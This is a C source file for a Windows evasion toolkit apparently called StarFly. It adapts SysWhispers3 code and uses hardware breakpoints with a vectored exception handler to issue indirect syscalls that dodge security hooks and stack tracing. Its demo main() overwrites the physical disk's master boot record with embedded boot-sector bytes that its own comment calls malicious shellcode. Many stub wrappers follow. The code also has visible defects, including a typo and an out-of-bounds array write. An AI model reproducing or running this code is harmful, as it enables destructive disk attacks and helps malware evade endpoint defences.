    #include <windows.h>
    #include <stdio.h>
    #include "syscalls.h"
    #include "nt.h"
    DWORD FuncHash;
    typedef struct _SFParams {
        DWORD ParamNum;
        DWORD FuncHash;
        DWORD_PTR param[17];
    } SFParams, * PSFParams;

    SFParams Params = { 0 }; // 全局变量 用于向VEH传递真实的函数调用参数

    /*========================================
    以下代码属于GitHub项目 SysWhisper3 的部分引用
    https://github.com/klezVirus/SysWhispers3
    ========================================*/
    SW3_SYSCALL_LIST SW3_SyscallList;

    DWORD SW3_HashSyscall(PCSTR FunctionName)
    {
        DWORD i = 0;
        DWORD Hash = SW3_SEED;

        while (FunctionName[i])
        {
            WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
            Hash ^= PartialName + SW3_ROR8(Hash);
        }

        return Hash;
    }

    PVOID SC_Address(PVOID NtApiAddress)
    {
        DWORD searchLimit = 512;
        PVOID SyscallAddress;
        BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
        ULONG distance_to_syscall = 0x12;
        // we don't really care if there is a 'jmp' between
        // NtApiAddress and the 'syscall; ret' instructions
        SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
            // we can use the original code for this system call :)
            return SyscallAddress;
        }
        // the 'syscall; ret' intructions have not been found,
        // we will try to use one near it, similarly to HalosGate
        for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
        {
            // let's try with an Nt* API below our syscall
            SyscallAddress = SW3_RVA2VA(
                PVOID,
                NtApiAddress,
                distance_to_syscall + num_jumps * 0x20);
            if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            {
                return SyscallAddress;
            }
            // let's try with an Nt* API above our syscall
            SyscallAddress = SW3_RVA2VA(
                PVOID,
                NtApiAddress,
                distance_to_syscall - num_jumps * 0x20);
            if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            {
                return SyscallAddress;
            }
        }
        return NULL;
    }

    BOOL SW3_PopulateSyscallList()
    {
        if (SW3_SyscallList.Count) return TRUE;
        PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
        PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
        PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
        PVOID DllBase = NULL;
        // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
        // in the list, so it's safer to loop through the full list and find it.
        PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
        for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
        {
            DllBase = LdrEntry->DllBase;
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
            PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
            PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
            DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (VirtualAddress == 0) continue;
            ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
            // If this is NTDLL.dll, exit loop.
            PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
            if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
            if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
        }
        if (!ExportDirectory) return FALSE;
        DWORD NumberOfNames = ExportDirectory->NumberOfNames;
        PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
        PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
        PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
        // Populate SW3_SyscallList with unsorted Zw* entries.
        DWORD i = 0;
        PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
        do
        {
            PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
            // Is this a system call?
            if (*(USHORT*)FunctionName == 0x775a)
            {
                Entries[i].Hash = SW3_HashSyscall(FunctionName);
                Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
                Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));
                i++;
                if (i == SW3_MAX_ENTRIES) break;
            }
        } while (--NumberOfNames);
        // Save total number of system calls found.
        SW3_SyscallList.Count = i;
        // Sort the list by address in ascending order.
        for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
        {
            for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
            {
                if (Entries[j].Address > Entries[j + 1].Address)
                {
                    SW3_SYSCALL_ENTRY TempEntry;
                    TempEntry.Hash = Entries[j].Hash;
                    TempEntry.Address = Entries[j].Address;
                    TempEntry.SyscallAddress = Entries[j].SyscallAddress;
                    Entries[j].Hash = Entries[j + 1].Hash;
                    Entries[j].Address = Entries[j + 1].Address;
                    Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
                    Entries[j + 1].Hash = TempEntry.Hash;
                    Entries[j + 1].Address = TempEntry.Address;
                    Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
                }
            }
        }
        return TRUE;
    }

    PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
    {
        // Ensure SW3_SyscallList is populated.
        if (!SW3_PopulateSyscallList()) return NULL;

        for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
        {
            if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
            {
                return SW3_SyscallList.Entries[i].SyscallAddress;
            }
        }

        return NULL;
    }

    /*========================================
    以上代码属于GitHub项目 SysWhisper3 的部分引用
    https://github.com/klezVirus/SysWhispers3
    ========================================*/

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
        if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
            pExceptInfo->ContextRecord->Rcx = Params.param[1];
            pExceptInfo->ContextRecord->Rdx = Params.param[2];
            pExceptInfo->ContextRecord->R8 = Params.param[3];
            pExceptInfo->ContextRecord->R9 = Params.param[4];
            pExceptInfo->ContextRecord->R10 = Params.param[1];
            if (Params.ParamNum > 4) {
                int extra_para = Params.ParamNum - 4;
                DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // 偏移40字节 保留影子空间
                for (int i = 5; i < Params.ParamNum; ++i) {
                    stack[i - 5] = (DWORD64)(Params.param[i]); // 通过堆栈传递剩余参数
                }
            }
            Params.ParamNum = 0;
            for (int i = 0; i < 17; ++i) {
                Params.param[i] = 0;
            }
            pExceptInfo->ContextRecord->Dr0 = 0;
            pExceptInfo->ContextRecore->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    void SFSpoof(DWORD FuncHash) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        ctx.Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(FuncHash);
        ctx.Dr7 = 0x00000303; // 启用DR0读写执行全局断点
        SetThreadContext(GetCurrentThread(), &ctx);
        return;
    }

// Demo: 调用飞星内核 绕过用户态Hook和栈回溯 向MBR写入恶意Shellcode
int main() {
    unsigned char __mbr_bin[] = {
    0xfa, 0x31, 0xc0, 0x8e, 0xd8, 0x8e, 0xc0, 0x8e, 0xd0, 0xbc, 0x00, 0x7c,
    0xfb, 0xe8, 0x7a, 0x00, 0xe8, 0x87, 0x00, 0xe8, 0x8b, 0x00, 0x06, 0xb8,
    0x00, 0x40, 0x8e, 0xc0, 0x26, 0x66, 0x83, 0x3e, 0x10, 0x00, 0x00, 0x7e,
    0x18, 0xe8, 0x17, 0x00, 0xe8, 0x7d, 0x00, 0x66, 0x83, 0x06, 0x18, 0x7d,
    0x78, 0x8c, 0xc0, 0x26, 0x66, 0x83, 0x2e, 0x10, 0x00, 0x78, 0x07, 0xeb,
    0xd9, 0x07, 0xc3, 0x06, 0xb8, 0x00, 0x40, 0x8e, 0xc0, 0x66, 0xbf, 0x00,
    0x06, 0x00, 0x00, 0x66, 0xb9, 0x00, 0x3c, 0x00, 0x00, 0x66, 0x31, 0xc0,
    0xf3, 0x66, 0xab, 0xbe, 0x00, 0x03, 0xc6, 0x04, 0x10, 0xc6, 0x44, 0x01,
    0x00, 0xc7, 0x44, 0x02, 0x78, 0x00, 0xc7, 0x44, 0x04, 0x00, 0x06, 0xc7,
    0x44, 0x06, 0x00, 0x40, 0x66, 0xa1, 0x18, 0x7d, 0x66, 0x89, 0x44, 0x08,
    0xc7, 0x44, 0x0c, 0x00, 0x00, 0xc7, 0x44, 0x0e, 0x00, 0x00, 0xb4, 0x43,
    0xb2, 0x80, 0xcd, 0x13, 0x07, 0xc3, 0x1e, 0xb8, 0x00, 0x40, 0x8e, 0xd8,
    0x31, 0xf6, 0xb4, 0x48, 0xb2, 0x80, 0xcd, 0x13, 0x1f, 0xc3, 0xb4, 0x00,
    0xb0, 0x03, 0xcd, 0x10, 0xc3, 0xbe, 0xf4, 0x7c, 0xe8, 0x15, 0x00, 0xc3,
    0x60, 0xb6, 0x01, 0xb2, 0x00, 0xb7, 0x00, 0xb4, 0x02, 0xcd, 0x10, 0x66,
    0xa1, 0x18, 0x7d, 0xe8, 0x10, 0x00, 0x61, 0xc3, 0x60, 0xb4, 0x0e, 0xac,
    0x3c, 0x00, 0x74, 0x04, 0xcd, 0x10, 0xeb, 0xf7, 0x61, 0xc3, 0x60, 0xb9,
    0x08, 0x00, 0xbb, 0x0a, 0x00, 0x31, 0xd2, 0x31, 0xd2, 0xf7, 0xf3, 0x80,
    0xc2, 0x30, 0x52, 0x49, 0x66, 0x85, 0xc0, 0x75, 0xf2, 0x5a, 0x83, 0xfa,
    0x00, 0x74, 0x08, 0xb4, 0x0e, 0x88, 0xd0, 0xcd, 0x10, 0xeb, 0xf2, 0x61,
    0xc3, 0x00, 0x00, 0x00, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f,
    0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x43,
    0x4e, 0x4d, 0x72, 0x53, 0x75, 0x6e, 0x73, 0x68, 0x69, 0x6e, 0x65, 0x2f,
    0x53, 0x74, 0x61, 0x72, 0x46, 0x6c, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
    };
        AddVectoredExceptionHandler(1, ExceptionHandler); // 一定一定不要忘记注册VEH
        HANDLE hDrive;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatusBlock;
        UNICODE_STRING driveName;
        WCHAR driveNameBuffer[] = L"\\Device\\Harddisk0\\Partition0";
        driveName.Length = sizeof(driveNameBuffer) - sizeof(WCHAR);
        driveName.MaximumLength = sizeof(driveNameBuffer);
        driveName.Buffer = driveNameBuffer;
        InitializeObjectAttributes(&objAttr, &driveName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        SFNtCreateFile(&hDrive, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatusBlock, 0, 0, FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
        LARGE_INTEGER byteOffset;
        byteOffset.QuadPart = 0;
        BYTE buffer[512] = { 0 };
        memcpy(buffer, __mbr_bin, 512);
        SFNtWriteFile(hDrive, 0, 0, 0, &ioStatusBlock, buffer, 512, &byteOffset, 0);
        return 0;
    }
NTSTATUS SFNtAccessCheck(PSECURITY_DESCRIPTOR pSecurityDescriptor, HANDLE ClientToken, ACCESS_MASK DesiaredAccess, PGENERIC_MAPPING GenericMapping, PPRIVILEGE_SET PrivilegeSet, PULONG PrivilegeSetLength, PACCESS_MASK GrantedAccess, PBOOLEAN AccessStatus) {
    Params.param[1] = (DWORD_PTR)pSecurityDescriptor;
    Params.param[2] = (DWORD_PTR)ClientToken;
    Params.param[3] = (DWORD_PTR)DesiaredAccess;
    Params.param[4] = (DWORD_PTR)GenericMapping;
    Params.param[5] = (DWORD_PTR)PrivilegeSet;
    Params.param[6] = (DWORD_PTR)PrivilegeSetLength;
    Params.param[7] = (DWORD_PTR)GrantedAccess;
    Params.param[8] = (DWORD_PTR)AccessStatus;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x0429E3D77;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWorkerFactoryWorkerReady(HANDLE WorkerFactoryHandle) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x093BB77D7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAcceptConnectPort(PHANDLE ServerPortHandle, ULONG AlternativeReceivePortHandle, PPORT_MESSAGE ConnectionReply, BOOLEAN AcceptConnection, PPORT_SECTION_WRITE ServerSharedMemory, PPORT_SECTION_READ ClientSharedMemory) {
    Params.param[1] = (DWORD_PTR)ServerPortHandle;
    Params.param[2] = (DWORD_PTR)AlternativeReceivePortHandle;
    Params.param[3] = (DWORD_PTR)ConnectionReply;
    Params.param[4] = (DWORD_PTR)AcceptConnection;
    Params.param[5] = (DWORD_PTR)ServerSharedMemory;
    Params.param[6] = (DWORD_PTR)ClientSharedMemory;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x024B23D18;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMapUserPhysicalPagesScatter(PVOID VirtualAddresses, PULONG NumberOfPages, PULONG UserPfnArray) {
    Params.param[1] = (DWORD_PTR)VirtualAddresses;
    Params.param[2] = (DWORD_PTR)NumberOfPages;
    Params.param[3] = (DWORD_PTR)UserPfnArray;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x001C8772D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForSingleObject(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut) {
    Params.param[1] = (DWORD_PTR)ObjectHandle;
    Params.param[2] = (DWORD_PTR)Alertable;
    Params.param[3] = (DWORD_PTR)TimeOut;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0E05EC0E2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCallbackReturn(PVOID OutputBuffer, ULONG OutputLength, NTSTATUS Status) {
    Params.param[1] = (DWORD_PTR)OutputBuffer;
    Params.param[2] = (DWORD_PTR)OutputLength;
    Params.param[3] = (DWORD_PTR)Status;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0048EE991;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)ByteOffset;
    Params.param[9] = (DWORD_PTR)Key;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x02E7FE12F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)IoControlCode;
    Params.param[7] = (DWORD_PTR)InputBuffer;
    Params.param[8] = (DWORD_PTR)InputBufferLength;
    Params.param[9] = (DWORD_PTR)OutputBuffer;
    Params.param[10] = (DWORD_PTR)OutputBufferLength;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x0781942BE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)ByteOffset;
    Params.param[9] = (DWORD_PTR)Key;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0A4B2DEA5;
    SFSpoof(Params.FuncHash);
    WritePrivateProfileString(
        "StarFly",
        "Version",
        "2.0",
        "Version.ini"
    );
    return 0;
}

NTSTATUS SFNtRemoveIoCompletion(HANDLE IoCompletionHandle, PULONG KeyContext, PULONG ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)KeyContext;
    Params.param[3] = (DWORD_PTR)ApcContext;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = (DWORD_PTR)Timeout;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0029A000B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReleaseSemaphore(HANDLE SemaphoreHandle, LONG ReleaseCount, PLONG PreviousCount) {
    Params.param[1] = (DWORD_PTR)SemaphoreHandle;
    Params.param[2] = (DWORD_PTR)ReleaseCount;
    Params.param[3] = (DWORD_PTR)PreviousCount;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x075275B64;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplyWaitReceivePort(HANDLE PortHandle, PVOID PortContext, PPORT_MESSAGE ReplyMessage, PPORT_MESSAGE ReceiveMessage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortContext;
    Params.param[3] = (DWORD_PTR)ReplyMessage;
    Params.param[4] = (DWORD_PTR)ReceiveMessage;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x06CF0757C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplyPort(HANDLE PortHandle, PPORT_MESSAGE ReplyMessage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ReplyMessage;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D171E0DD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)ThreadInformationClass;
    Params.param[3] = (DWORD_PTR)ThreadInformation;
    Params.param[4] = (DWORD_PTR)ThreadInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0D48834D7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetEvent(HANDLE EventHandle, PULONG PreviousState) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)PreviousState;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x036AD190E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtClose(HANDLE Handle) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x034941D19;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

